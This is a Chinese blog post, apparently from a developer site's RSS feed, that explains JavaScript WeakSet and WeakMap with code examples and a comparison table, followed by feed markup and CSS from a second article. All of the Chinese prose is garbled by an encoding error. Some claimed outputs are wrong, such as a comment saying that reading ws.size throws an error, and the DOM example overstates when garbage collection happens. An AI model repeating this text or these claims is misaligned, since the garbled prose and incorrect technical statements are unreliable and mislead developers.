<p>èŠå®Œ <code>Set</code> å’Œ <code>Map</code>ï¼Œå¿…é¡»æå®ƒä»¬çš„ <strong>â€œä½è°ƒå…„å¼Ÿâ€</strong>â€”â€”<code>WeakSet</code> å’Œ <code>WeakMap</code>ï¼Œè¿™ä¿©ä¸»æ‰“ä¸€ä¸ª <strong>â€œå¼±å¼•ç”¨â€</strong>ï¼Œå ªç§°<strong>å†…å­˜æ³„æ¼çš„ â€œå…‹æ˜Ÿâ€</strong>ï¼Œä¸€ä¸ªå®ˆæŠ¤ Set ä½“ç³»ï¼Œä¸€ä¸ªå®ˆæŠ¤ Map ä½“ç³»ï¼Œåˆ†å·¥æ˜ç¡®åˆè¶…å®ç”¨ï¼ç”šè‡³æœ‰äº›å‰ç«¯å¼€å‘è€…éƒ½ä¸çŸ¥é“æœ‰è¿™ä¿©ç©æ„ï¼å¿…é¡»è¡¥å……ä¸Šâ¬†ï¸ï¼</p>
<h4 data-id="heading-11">1. WeakSetï¼šSet çš„ â€œå†…å­˜å‹å¥½ç‰ˆâ€ï¼Œåªå­˜å¯¹è±¡ + è‡ªåŠ¨å›æ”¶</h4>
<p><code>WeakSet</code> æ˜¯ <code>Set</code> çš„ <strong>â€œè½»é‡ç‰ˆâ€</strong>ï¼Œæ ¸å¿ƒè§„åˆ™å…ˆåˆ’é‡ç‚¹ï¼š</p>
<ul>
<li>åªèƒ½å­˜å‚¨<strong>å¯¹è±¡ç±»å‹</strong>ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ç­‰åŸå§‹ç±»å‹<strong>ä¸€æ¦‚ä¸æ”¶</strong>ï¼Œå­˜äº†ä¹Ÿç™½å­˜ï¼‰ï¼›</li>
<li>å¯¹å­˜å‚¨çš„å¯¹è±¡æ˜¯<strong>å¼±å¼•ç”¨</strong>ï¼šå¦‚æœå¤–éƒ¨<strong>æ²¡æœ‰å…¶ä»–å¼•ç”¨æŒ‡å‘è¿™ä¸ªå¯¹è±¡</strong>ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼š<strong>è‡ªåŠ¨æŠŠ WeakSet é‡Œçš„è¿™ä¸ªå¯¹è±¡æ¸…ç†æ‰</strong>ï¼Œç»ä¸å å†…å­˜ï¼›</li>
<li><strong>ä¸å¯éå†</strong>ï¼ˆæ²¡æœ‰ keys ()/values ()/forEach ç­‰éå†æ–¹æ³•ï¼‰ï¼Œä¹Ÿæ²¡æœ‰ size å±æ€§ï¼Œä¸»æ‰“ä¸€ä¸ª <strong>â€œé»˜é»˜å¹²æ´»ä¸éœ²é¢â€</strong>ã€‚</li>
</ul>
<p><strong>é”™è¯¯ç¤ºä¾‹ï¼šå‘WeakSetæ·»åŠ åŸå§‹ç±»å‹ï¼ˆä¼šç›´æ¥æŠ¥é”™ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> wsError = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å°è¯•æ·»åŠ æ•°å­—ï¼ˆåŸå§‹ç±»å‹ï¼‰ï¼Œä¼šæŠ›å‡ºTypeError</span>
    wsError.<span class="hljs-title function_">add</span>(<span class="hljs-number">123</span>); 
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŠ¥é”™ä¿¡æ¯ï¼š'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// è¾“å‡ºï¼šInvalid value used in weak set</span>
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a366d839912545efa0d80d683d4df24b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=SXdmL6Un8bBM0YyJEG1LKhXMr14%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ­£ç¡®ç¤ºä¾‹ï¼šWeakSetä»…å­˜å‚¨å¯¹è±¡+å¼±å¼•ç”¨ç‰¹æ€§</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 1. åˆå§‹åŒ–WeakSet</span>
<span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();

<span class="hljs-comment">// 2. å®šä¹‰å¯¹è±¡ï¼ˆåªæœ‰å¯¹è±¡èƒ½å­˜å…¥WeakSetï¼‰</span>
<span class="hljs-keyword">let</span> obj1 = { <span class="hljs-attr">name</span>: <span class="hljs-string">'JSç©å®¶1'</span> };
<span class="hljs-keyword">let</span> obj2 = { <span class="hljs-attr">name</span>: <span class="hljs-string">'JSç©å®¶2'</span> };

<span class="hljs-comment">// 3. å‘WeakSetæ·»åŠ å¯¹è±¡ï¼ˆæ­£å¸¸ç”Ÿæ•ˆï¼Œæ— æŠ¥é”™ï¼‰</span>
ws.<span class="hljs-title function_">add</span>(obj1);
ws.<span class="hljs-title function_">add</span>(obj2);

<span class="hljs-comment">// 4. åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼ˆè¿”å›å¸ƒå°”å€¼ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'obj1æ˜¯å¦åœ¨WeakSetä¸­ï¼š'</span>, ws.<span class="hljs-title function_">has</span>(obj1)); <span class="hljs-comment">// è¾“å‡ºï¼štrue</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'obj2æ˜¯å¦åœ¨WeakSetä¸­ï¼š'</span>, ws.<span class="hljs-title function_">has</span>(obj2)); <span class="hljs-comment">// è¾“å‡ºï¼štrue</span>

<span class="hljs-comment">// 5. åˆ é™¤æŒ‡å®šå¯¹è±¡ï¼ˆè¿”å›å¸ƒå°”å€¼ï¼Œå­˜åœ¨åˆ™åˆ é™¤å¹¶è¿”å›trueï¼‰</span>
ws.<span class="hljs-title function_">delete</span>(obj2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åˆ é™¤obj2åï¼Œobj2æ˜¯å¦å­˜åœ¨ï¼š'</span>, ws.<span class="hljs-title function_">has</span>(obj2)); <span class="hljs-comment">// è¾“å‡ºï¼šfalse</span>

<span class="hljs-comment">// 6. å¼±å¼•ç”¨æ ¸å¿ƒæ¼”ç¤ºï¼šå¤–éƒ¨é”€æ¯obj1çš„å¼•ç”¨</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é”€æ¯obj1å‰ï¼Œobj1æ˜¯å¦å­˜åœ¨ï¼š'</span>, ws.<span class="hljs-title function_">has</span>(obj1)); <span class="hljs-comment">// è¾“å‡ºï¼štrue</span>
obj1 = <span class="hljs-literal">null</span>; <span class="hljs-comment">// å¤–éƒ¨ä¸å†å¼•ç”¨obj1</span>
<span class="hljs-comment">// æ­¤æ—¶JSåƒåœ¾å›æ”¶å™¨ï¼ˆGCï¼‰ä¼šåœ¨åˆé€‚æ—¶æœºè‡ªåŠ¨æ¸…ç†WeakSetä¸­obj1çš„å¼•ç”¨</span>
<span class="hljs-comment">// æ³¨æ„ï¼šæ— æ³•é€šè¿‡ä»£ç ç›´æ¥éªŒè¯å›æ”¶ç»“æœï¼ˆWeakSetä¸å¯éå†ã€æ— sizeå±æ€§ï¼‰ï¼Œä½†åŸç†æ˜¯ç¡®å®šçš„</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa1b8a60e5ea45718f56fc734bd94aa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=4FZblI%2BpoHNt4g5R%2FQfWo1nIlrY%3D" alt="image.png" loading="lazy"/></p>
<p><strong>è¡¥å……ï¼šWeakSetä¸æ”¯æŒçš„æ“ä½œï¼ˆé¿å…è¸©å‘ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// WeakSetæ— sizeå±æ€§ï¼Œè®¿é—®ä¼šæŠ¥é”™</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-property">size</span>); 
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¿é—®sizeæŠ¥é”™:'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// è¾“å‡ºï¼šws.size is undefined</span>
}

<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// WeakSetä¸å¯éå†ï¼ŒforEachä¼šæŠ¥é”™</span>
    ws.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item)); 
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'forEachéå†æŠ¥é”™:'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// è¾“å‡ºï¼šws.forEach is not a function</span>
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76c4b1ba91924ae183415c2acd16c0c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=6ct19FKGqQiLvChHjr1BhLy%2FGIc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">2. WeakMapï¼šMap çš„ â€œå†…å­˜å‹å¥½ç‰ˆâ€ï¼Œé”®ä»…å¯¹è±¡ + è‡ªåŠ¨å›æ”¶</h4>
<p><code>WeakMap</code> æ˜¯ <code>Map</code> çš„ <strong>â€œä¸“å±å†…å­˜ç®¡å®¶â€</strong>ï¼Œæ ¸å¿ƒè§„åˆ™å’Œ <code>WeakSet</code> å‘¼åº”ï¼Œæ›´è´´åˆé”®å€¼å¯¹åœºæ™¯ï¼š</p>
<ul>
<li>é”®åªèƒ½æ˜¯<strong>å¯¹è±¡ç±»å‹</strong>ï¼ˆåŸå§‹ç±»å‹å½“é”®ç›´æ¥æ— æ•ˆï¼‰ï¼›</li>
<li>å¯¹é”®çš„å¼•ç”¨æ˜¯<strong>å¼±å¼•ç”¨</strong>ï¼šå¦‚æœå¤–éƒ¨æ²¡æœ‰å…¶ä»–å¼•ç”¨æŒ‡å‘è¿™ä¸ªé”®å¯¹è±¡ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨å›æ”¶è¿™ä¸ªé”®å€¼å¯¹ï¼Œå½»åº•æœç»å†…å­˜æ³„æ¼ï¼›</li>
<li><strong>ä¸å¯éå†</strong>ï¼ˆæ²¡æœ‰ keys ()/values ()/entries () ç­‰æ–¹æ³•ï¼‰ï¼Œä¹Ÿæ²¡æœ‰ clear () æ–¹æ³•ï¼Œä¸»æ‰“ â€œç”¨å®Œå³èµ°ä¸æ‹–æ²“â€ã€‚</li>
</ul>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 1. åˆå§‹åŒ–WeakMap</span>
<span class="hljs-keyword">let</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();

<span class="hljs-comment">// 2. å®šä¹‰å¯¹è±¡ä½œä¸ºé”®ï¼ˆç¬¦åˆ WeakMapçš„é”®è¦æ±‚ï¼‰</span>
<span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">name</span>: <span class="hljs-string">'JSç©å®¶'</span>};

<span class="hljs-comment">// 3. æ·»åŠ é”®å€¼å¯¹ï¼ˆé”®æ˜¯å¯¹è±¡ï¼Œæ­£å¸¸ç”Ÿæ•ˆï¼‰</span>
wm.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">'è¿™æ˜¯WeakMapçš„å€¼'</span>);

<span class="hljs-comment">// 4. æŸ¥çœ‹å€¼ï¼šæˆåŠŸè·å–</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wm.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// è¾“å‡ºï¼šè¿™æ˜¯WeakMapçš„å€¼</span>

<span class="hljs-comment">// 5. å¤–éƒ¨é”€æ¯objçš„å¼•ç”¨</span>
obj = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// æ­¤æ—¶WeakMapä¸­objå¯¹åº”çš„é”®å€¼å¯¹ä¼šè¢«åƒåœ¾å›æ”¶å™¨è‡ªåŠ¨æ¸…ç†ï¼ˆæ— æ³•é€šè¿‡ä»£ç ç›´æ¥éªŒè¯ï¼Œæ˜¯å†…å­˜å±‚é¢çš„è¡Œä¸ºï¼‰</span>

<span class="hljs-comment">// 6. å°è¯•ç”¨åŸå§‹ç±»å‹ï¼ˆå­—ç¬¦ä¸²ï¼‰å½“é”®ï¼šç›´æ¥æŠ¥é”™ï¼</span>
<span class="hljs-keyword">try</span> {
    wm.<span class="hljs-title function_">set</span>(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>); <span class="hljs-comment">// WeakMapä¸å…è®¸åŸå§‹ç±»å‹ä½œä¸ºé”®ï¼Œæ‰§è¡Œåˆ°è¿™è¡Œå°±ä¼šæŠ›é”™</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wm.<span class="hljs-title function_">get</span>(<span class="hljs-string">'hello'</span>)); <span class="hljs-comment">// è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é”™è¯¯åŸå› ï¼š'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// è¾“å‡ºï¼šé”™è¯¯åŸå› ï¼š Invalid value used as weak map key</span>
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a0a90ac9b8248808b9450288b0a3885~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=irEmI9JKYtStBbwSn1TC1mWDvxI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-13">3. ä¸ºå•¥éœ€è¦ WeakSet/WeakMapï¼Ÿä¸ºå•¥æœ‰äº›å¼€å‘è€…ç”šè‡³ä¸çŸ¥é“å®ƒä¿©ï¼Ÿ</h4>
<p>æ¯”å¦‚åš DOM å…ƒç´ çš„çŠ¶æ€ç®¡ç†ï¼Œç”¨ WeakMap å­˜ DOM å…ƒç´ å¯¹åº”çš„çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// å‡è®¾é¡µé¢æœ‰ä¸ªæŒ‰é’®å…ƒç´ </span>
<span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#myBtn'</span>);

<span class="hljs-comment">// ç”¨ WeakMapå­˜æŒ‰é’®çš„ç‚¹å‡»æ¬¡æ•°</span>
<span class="hljs-keyword">const</span> btnClickCount = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
btnClickCount.<span class="hljs-title function_">set</span>(btn, <span class="hljs-number">0</span>);

<span class="hljs-comment">// æŒ‰é’®ç‚¹å‡»æ—¶æ›´æ–°æ¬¡æ•°</span>
btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> count = btnClickCount.<span class="hljs-title function_">get</span>(btn);
    btnClickCount.<span class="hljs-title function_">set</span>(btn, count + <span class="hljs-number">1</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»æ¬¡æ•°ï¼š'</span>, count + <span class="hljs-number">1</span>);
});

<span class="hljs-comment">// å¦‚æœåç»­æŒ‰é’®è¢«ç§»é™¤ï¼ˆæ¯”å¦‚btn = nullï¼‰ï¼ŒWeakMapé‡Œçš„é”®å€¼å¯¹ä¼šè‡ªåŠ¨å›æ”¶ï¼Œä¸ä¼šå†…å­˜æ³„æ¼ï¼</span>
<span class="hljs-comment">// è¦æ˜¯ç”¨æ™®é€šMapï¼Œå³ä½¿btnè¢«ç§»é™¤ï¼ŒMapä¾ç„¶æŒæœ‰å¼ºå¼•ç”¨ï¼Œå†…å­˜ä¼šä¸€ç›´è¢«å ç”¨ï¼Œè¿™å°±æ˜¯å·®è·~</span>
</code></pre>
<h3 data-id="heading-14">å››ã€æ€»ç»“</h3>
<h4 data-id="heading-15">1. æœ€åå” ä¸¤å¥ï¼ˆæ ¸å¿ƒç‚¹ï¼‰ï¼š</h4>
<ul>
<li>
<p><code>Set</code> æ ¸å¿ƒæ˜¯<strong>å”¯ä¸€å€¼é›†åˆ</strong>ï¼Œä¸»æ‰“æ•°ç»„å»é‡ï¼Œæ”¯æŒ add/delete/has/clear ç­‰æ“ä½œï¼Œæ— æ³•é€šè¿‡ç´¢å¼•å–å€¼ï¼›</p>
</li>
<li>
<p><code>Map</code> æ ¸å¿ƒæ˜¯<strong>ä¸‡èƒ½é”®å€¼å¯¹</strong>ï¼Œé”®å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼Œå¼¥è¡¥ä¼ ç»Ÿå¯¹è±¡çŸ­æ¿ï¼Œæ”¯æŒ set/get/delete/has/clearï¼›</p>
</li>
<li>
<p><code>WeakSet/WeakMap</code> ä¸»æ‰“<strong>å¼±å¼•ç”¨ + è‡ªåŠ¨å›æ”¶</strong>ï¼Œä»…å­˜ / ä»…ä»¥å¯¹è±¡ä¸ºé”®ï¼Œä¸å¯éå†ï¼Œæ˜¯è§£å†³å†…å­˜æ³„æ¼çš„ç»ä½³æ–¹æ¡ˆã€‚</p>
</li>
</ul>
<h4 data-id="heading-16">2. ä¸€å¼ è¡¨ç†æ¸… Set/Map/WeakSet/WeakMap æ ¸å¿ƒåŒºåˆ«ï¼š</h4>






















































<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><code>Set</code></th><th><code>Map</code></th><th><code>WeakSet</code></th><th><code>WeakMap</code></th></tr></thead><tbody><tr><td>å­˜å‚¨å½¢å¼</td><td><strong>å•å€¼é›†åˆï¼ˆæ— é”®å€¼ï¼‰</strong></td><td>é”®å€¼å¯¹é›†åˆ</td><td>å•å€¼é›†åˆï¼ˆä»…å¯¹è±¡ï¼‰</td><td>é”®å€¼å¯¹é›†åˆï¼ˆé”®ä»…å¯¹è±¡ï¼‰</td></tr><tr><td>æˆå‘˜ / é”®ç±»å‹</td><td>ä»»æ„ç±»å‹</td><td><strong>é”®ï¼šä»»æ„ç±»å‹ï¼›</strong> å€¼ï¼šä»»æ„</td><td>ä»…å¯¹è±¡</td><td>é”®ï¼šä»…å¯¹è±¡ï¼›å€¼ï¼šä»»æ„</td></tr><tr><td>å¼•ç”¨ç±»å‹</td><td>å¼ºå¼•ç”¨</td><td>å¼ºå¼•ç”¨</td><td>å¼±å¼•ç”¨</td><td>å¼±å¼•ç”¨ï¼ˆä»…é”®ï¼‰</td></tr><tr><td>éå†æ€§</td><td>å¯éå†</td><td>å¯éå†</td><td><strong>ä¸å¯éå†</strong></td><td><strong>ä¸å¯éå†</strong></td></tr><tr><td>å†…å­˜å›æ”¶</td><td>æ‰‹åŠ¨æ¸…ç©º</td><td>æ‰‹åŠ¨æ¸…ç©º</td><td><strong>è‡ªåŠ¨å›æ”¶æ— å¼•ç”¨å¯¹è±¡</strong></td><td><strong>è‡ªåŠ¨å›æ”¶æ— å¼•ç”¨é”®å¯¹è±¡</strong></td></tr><tr><td>ç‰¹æ®Šå±æ€§</td><td>æœ‰ size</td><td>æœ‰ size</td><td><strong>æ—  size</strong></td><td><strong>æ—  size</strong></td></tr></tbody></table>
<h2 data-id="heading-17">ç»“è¯­</h2>
<p><code>Set</code> å°±åƒ <strong>â€œå»é‡ç¥å™¨â€</strong>ï¼Œè§£å†³æ•°ç»„é‡å¤é—®é¢˜æ‰‹åˆ°æ“’æ¥ï¼›<code>Map</code> æ˜¯ <strong>â€œä¸‡èƒ½é”®å€¼å¯¹â€</strong>ï¼Œå¼¥è¡¥äº†ä¼ ç»Ÿå¯¹è±¡çš„çŸ­æ¿ï¼›<code>WeakSet/WeakMap</code> åˆ™æ˜¯ <strong>â€œå†…å­˜ç®¡å®¶â€</strong>ï¼Œé»˜é»˜å¸®ä½ æ¸…ç†æ— ç”¨å†…å­˜ï¼Œæœç»æ³„æ¼ã€‚</p>
<p>è®°ä½<strong>æ ¸å¿ƒç”¨æ³•</strong>ï¼š</p>
<ul>
<li><strong>å»é‡ã€å­˜å”¯ä¸€å€¼ â†’ ç”¨ Setï¼›</strong></li>
<li><strong>éå­—ç¬¦ä¸²é”®çš„é”®å€¼å¯¹å­˜å‚¨ â†’ ç”¨ Mapï¼›</strong></li>
<li><strong>å­˜å¯¹è±¡ä¸”æ€•å†…å­˜æ³„æ¼ â†’ å­˜å•å€¼ç”¨ WeakSetï¼Œå­˜é”®å€¼å¯¹ç”¨ WeakMapã€‚</strong></li>
</ul>
<p>æŠŠè¿™å››ä¸ªç©æ˜ç™½ï¼ŒJS æ•°æ®å­˜å‚¨çš„å‘èƒ½å°‘è¸©ä¸€å¤§åŠï¼Œæ•ˆç‡ç›´æ¥æ‹‰æ»¡ï¼èµ¶å¿«ç”¨èµ·æ¥ï¼</p>
<blockquote>
<p>éœ€è¦äº†è§£å…¶ä»–æ•°æ®ç±»å‹çš„è¯»è€…å¯ä»¥çœ‹æˆ‘çš„æ–‡ç« ï¼š<a href="https://juejin.cn/post/7569909335909810185" target="_blank" title="https://juejin.cn/post/7569909335909810185">æ ˆä¸å †çš„ç²¾å¦™èˆå‰§ï¼šJavaScript æ•°æ®ç±»å‹æ·±åº¦è§£æ</a></p>
<p>é™„ä¸ŠES6çš„åŸæ–‡èµ„æ–™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fes6.ruanyifeng.com%2F%23docs%2Fset-map" target="_blank" title="https://es6.ruanyifeng.com/#docs/set-map" ref="nofollow noopener noreferrer">es6.ruanyifeng.com/#docs/set-mâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´æˆ‘æ˜¯æ€ä¹ˆç”¨AIå†™ä»£ç çš„]]></title>    <link>https://juejin.cn/post/7588865809473945640</link>    <guid>https://juejin.cn/post/7588865809473945640</guid>    <pubDate>2025-12-29T05:11:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588865809473945640" data-draft-id="7588730836865138703" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´æˆ‘æ˜¯æ€ä¹ˆç”¨AIå†™ä»£ç çš„"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,å‰ç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-29T05:11:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¾ä¸­èˆªçº¿æ—¥å¿—"/> <meta itemprop="url" content="https://juejin.cn/user/1996368848892542"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´æˆ‘æ˜¯æ€ä¹ˆç”¨AIå†™ä»£ç çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1996368848892542/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¾ä¸­èˆªçº¿æ—¥å¿—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:11:18.000Z" title="Mon Dec 29 2025 05:11:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body 